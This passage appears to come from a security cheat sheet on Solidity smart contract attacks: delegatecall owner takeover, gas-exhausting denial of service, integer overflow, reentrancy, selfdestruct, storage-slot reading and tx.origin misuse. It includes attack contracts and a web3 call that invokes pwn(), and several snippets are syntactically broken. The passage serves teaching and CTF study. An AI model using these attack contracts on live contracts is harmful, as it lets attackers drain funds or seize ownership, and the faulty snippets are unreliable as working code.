+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>// SPDX-License-Identifier: MIT
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>pragma solidity ^0.8.0;
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>contract DelegateA {
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>  address public owner;
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>  constructor(address _owner) {
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>    owner = _owner;
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>  }
+</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>
+</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>  function pwn() public {
+</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>    owner = msg.sender;
+</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a>  }
+</span><span id="__span-15-14"><a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a>}
+</span><span id="__span-15-15"><a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a>
+</span><span id="__span-15-16"><a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a>contract DelegateB {
+</span><span id="__span-15-17"><a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a>    address public owner;
+</span><span id="__span-15-18"><a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a>    DelegateA delegateA;
+</span><span id="__span-15-19"><a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a>
+</span><span id="__span-15-20"><a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a>    constructor(address _delegateA) {
+</span><span id="__span-15-21"><a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a>        delegateA = Delegate(_delegateA);
+</span><span id="__span-15-22"><a id="__codelineno-15-22" name="__codelineno-15-22" href="#__codelineno-15-22"></a>        owner = msg.sender;
+</span><span id="__span-15-23"><a id="__codelineno-15-23" name="__codelineno-15-23" href="#__codelineno-15-23"></a>    }
+</span><span id="__span-15-24"><a id="__codelineno-15-24" name="__codelineno-15-24" href="#__codelineno-15-24"></a>
+</span><span id="__span-15-25"><a id="__codelineno-15-25" name="__codelineno-15-25" href="#__codelineno-15-25"></a>    fallback() external {
+</span><span id="__span-15-26"><a id="__codelineno-15-26" name="__codelineno-15-26" href="#__codelineno-15-26"></a>        (bool result,) = address(delegateA).delegatecall(msg.data);
+</span><span id="__span-15-27"><a id="__codelineno-15-27" name="__codelineno-15-27" href="#__codelineno-15-27"></a>        if (result) {
+</span><span id="__span-15-28"><a id="__codelineno-15-28" name="__codelineno-15-28" href="#__codelineno-15-28"></a>            this;
+</span><span id="__span-15-29"><a id="__codelineno-15-29" name="__codelineno-15-29" href="#__codelineno-15-29"></a>        }
+</span><span id="__span-15-30"><a id="__codelineno-15-30" name="__codelineno-15-30" href="#__codelineno-15-30"></a>    }
+</span><span id="__span-15-31"><a id="__codelineno-15-31" name="__codelineno-15-31" href="#__codelineno-15-31"></a>}
+</span></code></pre></div>
+<ul>
+<li>
+<ol>
+<li>Attack</li>
+</ol>
+</li>
+</ul>
+<p>Call the <code>pwn</code> function by sending transaction because <code>delegatecall</code> exists in <code>fallback</code> function. This changes the owner of the <strong>DelegateA</strong> contract to <code>msg.sender</code> because the <code>delegatecall</code> overrides the slot value in the callee contract (it's <strong>DelegateA</strong>). In short, we can become the owner of this contract.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>contract.sendTransaction({data: web3.sha3(&#39;pwn()&#39;).slice(0, 10)})
+</span></code></pre></div>
+<p><br /></p>
+<ul>
+<li>Upgradeable Contract Storage Overriding</li>
+</ul>
+<p>If the contract is upgradeable using Proxy contract and the slot order is difference, we may be able to manipulate arbitrary slot values with delegatecall.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>contract ExampleV1 {
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>    uint public balance; // &lt;- we can overwrite this from the ExampleV2 contract
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>}
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>contract ExampleV2 {
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>    address public owner; // &lt;- we can overwrite this from the ExampleV1 contract
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>}
+</span></code></pre></div>
+<h1 id="solidity-denial-of-service-attack">Solidity Denial of Service Attack</h1>
+<p>We can denial the Solidity execution by consuming all gas using various ways.</p>
+<ul>
+<li>
+<p><a href="https://coinsbench.com/20-denial-ethernaut-explained-92bc3f7562ec">20-denial-ethernaut-explained</a></p>
+</li>
+<li>
+<p>DoS with Assembly Invalid Function</p>
+</li>
+</ul>
+<p>The <code>invalid()</code> opcode in in-line assembly consumes all the gas and causes Dos for the contract.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>// SPDX-License-Identifier: MIT
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>pragma solidity ^0.8.0;
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>contract Victim {
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>    address public owner;
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>    uint public balance;
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>
+</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>    function withdrawUser(address _address) {
+</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a>        (bool success, ) = _address.call{value: balance}(&quot;&quot;);
+</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a>        // Some code ...
+</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a>    }
+</span><span id="__span-18-12"><a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a>}
+</span><span id="__span-18-13"><a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a>
+</span><span id="__span-18-14"><a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a>contract Attack {
+</span><span id="__span-18-15"><a id="__codelineno-18-15" name="__codelineno-18-15" href="#__codelineno-18-15"></a>  Victim target;
+</span><span id="__span-18-16"><a id="__codelineno-18-16" name="__codelineno-18-16" href="#__codelineno-18-16"></a>
+</span><span id="__span-18-17"><a id="__codelineno-18-17" name="__codelineno-18-17" href="#__codelineno-18-17"></a>  constructor(address _targetAddress) {
+</span><span id="__span-18-18"><a id="__codelineno-18-18" name="__codelineno-18-18" href="#__codelineno-18-18"></a>    target = Victim(_targetAddress);
+</span><span id="__span-18-19"><a id="__codelineno-18-19" name="__codelineno-18-19" href="#__codelineno-18-19"></a>    target.withdrawUser(address(this));
+</span><span id="__span-18-20"><a id="__codelineno-18-20" name="__codelineno-18-20" href="#__codelineno-18-20"></a>  }
+</span><span id="__span-18-21"><a id="__codelineno-18-21" name="__codelineno-18-21" href="#__codelineno-18-21"></a>
+</span><span id="__span-18-22"><a id="__codelineno-18-22" name="__codelineno-18-22" href="#__codelineno-18-22"></a>  fallback() payable external {
+</span><span id="__span-18-23"><a id="__codelineno-18-23" name="__codelineno-18-23" href="#__codelineno-18-23"></a>    assembly {
+</span><span id="__span-18-24"><a id="__codelineno-18-24" name="__codelineno-18-24" href="#__codelineno-18-24"></a>      invalid()
+</span><span id="__span-18-25"><a id="__codelineno-18-25" name="__codelineno-18-25" href="#__codelineno-18-25"></a>    }
+</span><span id="__span-18-26"><a id="__codelineno-18-26" name="__codelineno-18-26" href="#__codelineno-18-26"></a>  }
+</span><span id="__span-18-27"><a id="__codelineno-18-27" name="__codelineno-18-27" href="#__codelineno-18-27"></a>}
+</span></code></pre></div>
+<h1 id="solidity-overflow-underflow">Solidity Overflow &amp; Underflow</h1>
+<p>Solidity is vulnerable to overflow and underflow of uint variables on the version &lt;0.8.</p>
+<ul>
+<li>Overflow</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>uint8 value = 255;
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>value++;
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>// Result: value = 0
+</span></code></pre></div>
+<p><br /></p>
+<ul>
+<li>Underflow</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>uint8 value = 0;
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>value--;
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>// Result: value = 255
+</span></code></pre></div>
+<h1 id="solidity-reentrancy-attack">Solidity Reentrancy Attack</h1>
+<p>Reentrancy Attack is a typical vulnerability of the Solidity smart contracts involving withdraw and deposit in Solidity. </p>
+<p>[Reference]</p>
+<ul>
+<li>
+<p><a href="https://hackernoon.com/hack-solidity-reentrancy-attack">hack-solidity-reentrancy-attack</a></p>
+</li>
+<li>
+<p>Create a Malicious Contract</p>
+</li>
+</ul>
+<p>The <strong>Attack</strong> contract executes the following:</p>
+<ol>
+<li><strong>Attack</strong> contract deposits the address itself by invoking the Victim <code>deposit</code> function.</li>
+<li><strong>Attack</strong> contract calls the Victim <code>withdraw</code> function.</li>
+<li>The <strong>fallback</strong> function of <strong>Attack</strong> contract is called and <code>withdraw</code> to send Ether to <strong>Attack</strong> contract.</li>
+</ol>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>pragma solidity ^0.8.0;
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>contract Victim {
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>    function deposit(address _to) public payable;
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>    function withdraw(uint _amount) public;
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>}
+</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a>
+</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a>contract Attack {
+</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>    Victim public victim;
+</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a>
+</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a>    constructor(address _victimAddress) {
+</span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a>        // Instantiate a victim contract
+</span><span id="__span-21-13"><a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a>        victim = Victim(_victimAddress);
+</span><span id="__span-21-14"><a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a>    }
+</span><span id="__span-21-15"><a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a>
+</span><span id="__span-21-16"><a id="__codelineno-21-16" name="__codelineno-21-16" href="#__codelineno-21-16"></a>    function attack(uint v) external payable {
+</span><span id="__span-21-17"><a id="__codelineno-21-17" name="__codelineno-21-17" href="#__codelineno-21-17"></a>        // Deposit to this contract (Attack) address
+</span><span id="__span-21-18"><a id="__codelineno-21-18" name="__codelineno-21-18" href="#__codelineno-21-18"></a>        victim.deposit{value: v}(this);   // victim.deposit.value(v)(this);
+</span><span id="__span-21-19"><a id="__codelineno-21-19" name="__codelineno-21-19" href="#__codelineno-21-19"></a>
+</span><span id="__span-21-20"><a id="__codelineno-21-20" name="__codelineno-21-20" href="#__codelineno-21-20"></a>        victim.withdraw();
+</span><span id="__span-21-21"><a id="__codelineno-21-21" name="__codelineno-21-21" href="#__codelineno-21-21"></a>    }
+</span><span id="__span-21-22"><a id="__codelineno-21-22" name="__codelineno-21-22" href="#__codelineno-21-22"></a>
+</span><span id="__span-21-23"><a id="__codelineno-21-23" name="__codelineno-21-23" href="#__codelineno-21-23"></a>    // Fallback function will be called when `deposit` function of the Victim contract called and send Ether to this contract.
+</span><span id="__span-21-24"><a id="__codelineno-21-24" name="__codelineno-21-24" href="#__codelineno-21-24"></a>    function() external payable {
+</span><span id="__span-21-25"><a id="__codelineno-21-25" name="__codelineno-21-25" href="#__codelineno-21-25"></a>        if (address(victim).balance &gt;= 1 ether) {
+</span><span id="__span-21-26"><a id="__codelineno-21-26" name="__codelineno-21-26" href="#__codelineno-21-26"></a>            victim.withdraw();
+</span><span id="__span-21-27"><a id="__codelineno-21-27" name="__codelineno-21-27" href="#__codelineno-21-27"></a>        }
+</span><span id="__span-21-28"><a id="__codelineno-21-28" name="__codelineno-21-28" href="#__codelineno-21-28"></a>    }
+</span><span id="__span-21-29"><a id="__codelineno-21-29" name="__codelineno-21-29" href="#__codelineno-21-29"></a>}
+</span></code></pre></div>
+<p>After compiling, deploy it and run <code>attack</code> function to get balances of the victim contract.</p>
+<h1 id="solidity-self-destruct-attack">Solidity Self Destruct Attack</h1>
+<p>Solidity’s ‘selfdestruct’ function may be used to destruct a target contract and steal the balance by an attacker.</p>
+<ul>
+<li>Create a Malicious Contract for Destructing Contract</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>// SPDX-License-Identifier: MIT
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>pragma solidity ^0.4.0;
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>contract Attack {
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>    function attack(address _address) payable public {
+</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>        // the remaining Ether sent to _address when destructing
+</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a>        selfdestruct(_address);
+</span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a>    }
+</span><span id="__span-22-9"><a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a>}
+</span></code></pre></div>
+<h1 id="solidity-smart-contract-attack-methodology">Solidity Smart Contract Attack Methodology</h1>
+<p>When attacking target contract, we can create an attack contract which loads the target contract and abuse it.</p>
+<ul>
+<li>Create an Attack Contract</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>// SPDX-License-Identifier: MIT
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>pragma solidity ^0.8.0;
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>// Define interface for victim contract
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>interface IVictim {
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>    // Set the Victim contract functions
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>    function example1() external;
+</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>    function example2(uint) external;
+</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>}
+</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a>
+</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a>// Define Attack contract to compromise the victim contract
+</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a>contract Attack {
+</span><span id="__span-23-13"><a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a>    IVictim public victim;
+</span><span id="__span-23-14"><a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a>
+</span><span id="__span-23-15"><a id="__codelineno-23-15" name="__codelineno-23-15" href="#__codelineno-23-15"></a>    constructor(address _victimAddress) {
+</span><span id="__span-23-16"><a id="__codelineno-23-16" name="__codelineno-23-16" href="#__codelineno-23-16"></a>        // Initialize Victim contract (interface)
+</span><span id="__span-23-17"><a id="__codelineno-23-17" name="__codelineno-23-17" href="#__codelineno-23-17"></a>        victim = IVictim(_victimAddress);
+</span><span id="__span-23-18"><a id="__codelineno-23-18" name="__codelineno-23-18" href="#__codelineno-23-18"></a>    }
+</span><span id="__span-23-19"><a id="__codelineno-23-19" name="__codelineno-23-19" href="#__codelineno-23-19"></a>
+</span><span id="__span-23-20"><a id="__codelineno-23-20" name="__codelineno-23-20" href="#__codelineno-23-20"></a>    // Create a function to be used for attacking the victim contract
+</span><span id="__span-23-21"><a id="__codelineno-23-21" name="__codelineno-23-21" href="#__codelineno-23-21"></a>    function attack() public {
+</span><span id="__span-23-22"><a id="__codelineno-23-22" name="__codelineno-23-22" href="#__codelineno-23-22"></a>        victim.example1();
+</span><span id="__span-23-23"><a id="__codelineno-23-23" name="__codelineno-23-23" href="#__codelineno-23-23"></a>        victim.example2(1);
+</span><span id="__span-23-24"><a id="__codelineno-23-24" name="__codelineno-23-24" href="#__codelineno-23-24"></a>    }
+</span><span id="__span-23-25"><a id="__codelineno-23-25" name="__codelineno-23-25" href="#__codelineno-23-25"></a>}
+</span></code></pre></div>
+<h1 id="solidity-storage-values-analysis">Solidity Storage Values Analysis</h1>
+<p>[Reference]</p>
+<ul>
+<li><a href="https://ethernaut.openzeppelin.com/level/0xcAac6e4994c2e21C5370528221c226D1076CfDAB">ethernaut.openzeppelin</a></li>
+<li>
+<p><a href="https://coinsbench.com/12-privacy-ethernaut-explained-8ee480f303f2">12-privacy-ethernaut-explained</a></p>
+</li>
+<li>
+<p>Data Byte Sizes</p>
+</li>
+</ul>
+<p>Reference: <a href="https://tomatosauce.jp/datatype-bytesize/">https://tomatosauce.jp/datatype-bytesize/</a></p>
+<p>In Solidity, each data type has the following size:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">Type</th>
+<th style="text-align: center;">Bytes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">bool</td>
+<td style="text-align: center;">1</td>
+</tr>
+<tr>
+<td style="text-align: center;">bytes1</td>
+<td style="text-align: center;">1</td>
+</tr>
+<tr>
+<td style="text-align: center;">bytes8</td>
+<td style="text-align: center;">8</td>
+</tr>
+<tr>
+<td style="text-align: center;">bytes16</td>
+<td style="text-align: center;">16</td>
+</tr>
+<tr>
+<td style="text-align: center;">bytes32</td>
+<td style="text-align: center;">32</td>
+</tr>
+<tr>
+<td style="text-align: center;">address</td>
+<td style="text-align: center;">20</td>
+</tr>
+<tr>
+<td style="text-align: center;">contract</td>
+<td style="text-align: center;">20</td>
+</tr>
+<tr>
+<td style="text-align: center;">uint8/int8</td>
+<td style="text-align: center;">1</td>
+</tr>
+<tr>
+<td style="text-align: center;">uint16/int16</td>
+<td style="text-align: center;">2</td>
+</tr>
+<tr>
+<td style="text-align: center;">uint32/int32</td>
+<td style="text-align: center;">4</td>
+</tr>
+<tr>
+<td style="text-align: center;">uint64/int64</td>
+<td style="text-align: center;">8</td>
+</tr>
+<tr>
+<td style="text-align: center;">uint128/int128</td>
+<td style="text-align: center;">16</td>
+</tr>
+<tr>
+<td style="text-align: center;">uint256/int256</td>
+<td style="text-align: center;">32</td>
+</tr>
+</tbody>
+</table>
+<p><br /></p>
+<ul>
+<li>Access Storage Slot Values</li>
+</ul>
+<p>Reference: https://coinsbench.com/12-privacy-ethernaut-explained-8ee480f303f2</p>
+<p>Below is the Solidity contract example.  </p>
+<p>The Solidity’s each slot can store data until 32 bytes. For example below, the ‘Slot 2’ stores multiple variables because each value is just 1 byte, which are 2 bytes in total so less than 32 bytes.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>contract Example {
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>    // Slot 0 (1 byte)
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>    bool public isOk = false;
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>    // Slot 1 (32 bytes)
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>    uint public money = 100;
+</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>    // Slot 2 (1 byte)
+</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>    uint8 private score = 10;
+</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>    // Slot 2 (1 byte)
+</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a>    uint8 private quantity = 5;
+</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a>    // Slot 3, 4, 5 (32 bytes for each element of array)
+</span><span id="__span-24-11"><a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a>    bytes32[3] private data;
+</span><span id="__span-24-12"><a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a>}
+</span></code></pre></div>
+<p>Using Web3.js, we can get values of the above variables from outside.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>// Access slot 0
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>web3.eth.getStorageAt(contract.address, 0);
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>// Access slot 1
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>web3.eth.getStorageAt(contract.address, 1);
+</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>// Access slot 2
+</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>web3.eth.getStorageAt(contract.address, 2);
+</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a>// Access slot 3 (data[0])
+</span><span id="__span-25-8"><a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a>web3.eth.getStorageAt(contract.address, 3);
+</span><span id="__span-25-9"><a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a>// Access slot 4 (data[1])
+</span><span id="__span-25-10"><a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a>web3.eth.getStorageAt(contract.address, 4);
+</span><span id="__span-25-11"><a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a>// Access stlo 5 (data[2])
+</span><span id="__span-25-12"><a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a>web3.eth.getStorageAt(contract.address, 5);
+</span><span id="__span-25-13"><a id="__codelineno-25-13" name="__codelineno-25-13" href="#__codelineno-25-13"></a>
+</span><span id="__span-25-14"><a id="__codelineno-25-14" name="__codelineno-25-14" href="#__codelineno-25-14"></a>// Proxy storage slot (0x123...)
+</span><span id="__span-25-15"><a id="__codelineno-25-15" name="__codelineno-25-15" href="#__codelineno-25-15"></a>web3.eth.storageAt(contract.address, &quot;0x123...&quot;);
+</span></code></pre></div>
+<ul>
+<li>Display Values</li>
+</ul>
+<p>There are methods to see the storage slot values in appropriate format.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>const slotValue = await web3.eth.getStorageAt(contract.address, 0);
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>// for string value
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>web3.utils.toAscii(slotValue);
+</span></code></pre></div>
+<h1 id="solidity-tx-origin-attack">Solidity Tx Origin Attack</h1>
+<p>The Solidity 'tx.origin' should not be used for authorization e.g. when transferring ether to a wallet because tx.origin is the address of EOA (Externallly Owned Account) that the originated the transaction, not the address of caller for the function on the smart contract (this is msg.sender).</p>
+<p>[Reference]</p>
+<ul>
+<li><a href="https://medium.com/coinmonks/solidity-tx-origin-attacks-58211ad95514">solidity-tx-origin-attacks</a></li>
+<li>
+<p><a href="https://docs.soliditylang.org/en/develop/security-considerations.html#tx-origin">security-considerations</a></p>
+</li>
+<li>
+<p>Inappropriate User Authorization</p>
+</li>
+</ul>
+<p>Reference: <a href="https://docs.soliditylang.org/en/develop/security-considerations.html#tx-origin">https://docs.soliditylang.org/en/develop/security-considerations.html#tx-origin</a></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>// Vulnerable: comparing the contract owner with tx.origin
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>require(tx.origin == owner)
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>
+</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>// Vulnerable: 
+</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>require(tx.origin == msg.sender)
+</span></code></pre></div>
+<ul>
+<li>
+<ol>
+<li>Vulnerable Wallet</li>
+</ol>
+</li>
+</ul>
+<p>For example, the following wallet validates a user with <code>tx.origin == owner</code>. However, this <code>tx.origin</code> is vulnerable because <code>tx.origin</code> is not</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>// SPDX-License-Identifier: GPL-3.0
